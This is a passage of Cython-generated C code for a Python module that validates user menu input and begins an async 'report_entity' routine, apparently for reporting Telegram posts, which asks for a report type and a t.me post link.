          __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
          goto __pyx_L8_exception_handled;
        }
        goto __pyx_L9_except_error;
        __pyx_L9_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        goto __pyx_L1_error;
        __pyx_L11_try_return:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        goto __pyx_L0;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        __pyx_L14_try_end:;
      }

      
      goto __pyx_L6;
    }

    
    /*else*/ {
      __Pyx_XDECREF(__pyx_r);
      __Pyx_INCREF(__pyx_v_user_input);
      __pyx_r = __pyx_v_user_input;
      goto __pyx_L0;
    }
    __pyx_L6:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("source.get_valid_input", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_user_input);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_7get_valid_integer_input(PyObject *__pyx_self, PyObject *__pyx_v_prompt); /*proto*/
static PyMethodDef __pyx_mdef_6source_7get_valid_integer_input = {"get_valid_integer_input", (PyCFunction)__pyx_pw_6source_7get_valid_integer_input, METH_O, 0};
static PyObject *__pyx_pw_6source_7get_valid_integer_input(PyObject *__pyx_self, PyObject *__pyx_v_prompt) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_valid_integer_input (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_6get_valid_integer_input(__pyx_self, ((PyObject *)__pyx_v_prompt));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_6get_valid_integer_input(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_prompt) {
  PyObject *__pyx_v_user_input = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_valid_integer_input", 0);

  
  while (1) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_colored); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 73, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    __pyx_t_4 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_4 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_2)) {
      PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_v_prompt, __pyx_n_u_red};
      __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_4, 2+__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 73, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_GOTREF(__pyx_t_1);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
      PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_v_prompt, __pyx_n_u_red};
      __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_4, 2+__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 73, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_GOTREF(__pyx_t_1);
    } else
    #endif
    {
      __pyx_t_5 = PyTuple_New(2+__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 73, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (__pyx_t_3) {
        __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_3); __pyx_t_3 = NULL;
      }
      __Pyx_INCREF(__pyx_v_prompt);
      __Pyx_GIVEREF(__pyx_v_prompt);
      PyTuple_SET_ITEM(__pyx_t_5, 0+__pyx_t_4, __pyx_v_prompt);
      __Pyx_INCREF(__pyx_n_u_red);
      __Pyx_GIVEREF(__pyx_n_u_red);
      PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_4, __pyx_n_u_red);
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 73, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 73, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF_SET(__pyx_v_user_input, __pyx_t_2);
    __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_check_exit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 74, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_v_user_input) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_user_input);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_check_home); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 75, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_v_user_input) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_user_input);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 75, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 75, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (__pyx_t_6) {

      
      __Pyx_XDECREF(__pyx_r);
      __Pyx_INCREF(__pyx_n_u_home);
      __pyx_r = __pyx_n_u_home;
      goto __pyx_L0;

      
    }

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_9);
      /*try:*/ {

        
        __Pyx_XDECREF(__pyx_r);
        __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_v_user_input); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 78, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_r = __pyx_t_2;
        __pyx_t_2 = 0;
        goto __pyx_L10_try_return;

        
      }
      __pyx_L6_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      __pyx_t_4 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
      if (__pyx_t_4) {
        __Pyx_AddTraceback("source.get_valid_integer_input", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_5) < 0) __PYX_ERR(0, 79, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_5);

        
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 80, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 80, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 80, __pyx_L8_except_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        goto __pyx_L7_exception_handled;
      }
      goto __pyx_L8_except_error;
      __pyx_L8_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
      goto __pyx_L1_error;
      __pyx_L10_try_return:;
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
      goto __pyx_L0;
      __pyx_L7_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
    }
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("source.get_valid_integer_input", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_user_input);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_10generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



/* Python wrapper */
static PyObject *__pyx_pw_6source_9report_entity(PyObject *__pyx_self, PyObject *__pyx_v_client); /*proto*/
static PyMethodDef __pyx_mdef_6source_9report_entity = {"report_entity", (PyCFunction)__pyx_pw_6source_9report_entity, METH_O, 0};
static PyObject *__pyx_pw_6source_9report_entity(PyObject *__pyx_self, PyObject *__pyx_v_client) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("report_entity (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_8report_entity(__pyx_self, ((PyObject *)__pyx_v_client));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8report_entity(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_client) {
  struct __pyx_obj_6source___pyx_scope_struct__report_entity *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("report_entity", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct__report_entity *)__pyx_tp_new_6source___pyx_scope_struct__report_entity(__pyx_ptype_6source___pyx_scope_struct__report_entity, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct__report_entity *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 83, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  __pyx_cur_scope->__pyx_v_client = __pyx_v_client;
  __Pyx_INCREF(__pyx_cur_scope->__pyx_v_client);
  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_v_client);
  {
    __pyx_CoroutineObject *gen = __Pyx_Coroutine_New((__pyx_coroutine_body_t) __pyx_gb_6source_10generator, __pyx_codeobj__5, (PyObject *) __pyx_cur_scope, __pyx_n_s_report_entity, __pyx_n_s_report_entity, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 83, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.report_entity", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_10generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct__report_entity *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct__report_entity *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  int __pyx_t_10;
  Py_ssize_t __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *(*__pyx_t_16)(PyObject *);
  Py_ssize_t __pyx_t_17;
  Py_UCS4 __pyx_t_18;
  PyObject *__pyx_t_19 = NULL;
  PyObject *(*__pyx_t_20)(PyObject *);
  PyObject *__pyx_t_21 = NULL;
  PyObject *__pyx_t_22 = NULL;
  char const *__pyx_t_23;
  PyObject *__pyx_t_24 = NULL;
  PyObject *__pyx_t_25 = NULL;
  PyObject *__pyx_t_26 = NULL;
  PyObject *__pyx_t_27 = NULL;
  PyObject *__pyx_t_28 = NULL;
  PyObject *__pyx_t_29 = NULL;
  char const *__pyx_t_30;
  char const *__pyx_t_31;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("report_entity", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L23_resume_from_await;
    case 2: goto __pyx_L32_resume_from_await;
    case 3: goto __pyx_L54_resume_from_await;
    case 4: goto __pyx_L79_resume_from_await;
    case 5: goto __pyx_L80_resume_from_await;
    case 6: goto __pyx_L85_resume_from_await;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 83, __pyx_L1_error)

  
  while (1) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_colored); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 86, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 85, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_get_valid_input); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 89, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);

    
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = PyList_New(5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_int_1);
    __Pyx_GIVEREF(__pyx_int_1);
    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_1);
    __Pyx_INCREF(__pyx_int_2);
    __Pyx_GIVEREF(__pyx_int_2);
    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_2);
    __Pyx_INCREF(__pyx_int_3);
    __Pyx_GIVEREF(__pyx_int_3);
    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_3);
    __Pyx_INCREF(__pyx_int_4);
    __Pyx_GIVEREF(__pyx_int_4);
    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_4);
    __Pyx_INCREF(__pyx_int_5);
    __Pyx_GIVEREF(__pyx_int_5);
    PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_5);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_valid_options, __pyx_t_3) < 0) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__7, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_report_type);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_report_type, __pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    __pyx_t_3 = 0;

    
    __pyx_t_4 = (__Pyx_PyUnicode_Equals(__pyx_cur_scope->__pyx_v_report_type, __pyx_n_u_home, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 93, __pyx_L1_error)
    if (__pyx_t_4) {

      
      goto __pyx_L4_continue;

      
    }

    
    __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 96, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = __Pyx_PyInt_EqObjC(__pyx_cur_scope->__pyx_v_report_type, __pyx_int_5, 5, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (__pyx_t_4) {

      
      while (1) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 101, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__8, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 101, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

        
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 100, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_post_link);
        __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_post_link, __pyx_t_3);
        __Pyx_GIVEREF(__pyx_t_3);
        __pyx_t_3 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_check_exit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 104, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_cur_scope->__pyx_v_post_link) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_cur_scope->__pyx_v_post_link);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 104, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_check_home); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_cur_scope->__pyx_v_post_link) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_cur_scope->__pyx_v_post_link);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 105, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 105, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (__pyx_t_4) {

          
          goto __pyx_L9_break;

          
        }

        
        __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 107, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

        
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_post_link, __pyx_n_s_startswith); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 109, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_kp_u_https_t_me) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_u_https_t_me);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 109, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 109, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_5 = ((!__pyx_t_4) != 0);
        if (__pyx_t_5) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 111, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 111, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 110, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
          goto __pyx_L8_continue;

          
        }

        
        {
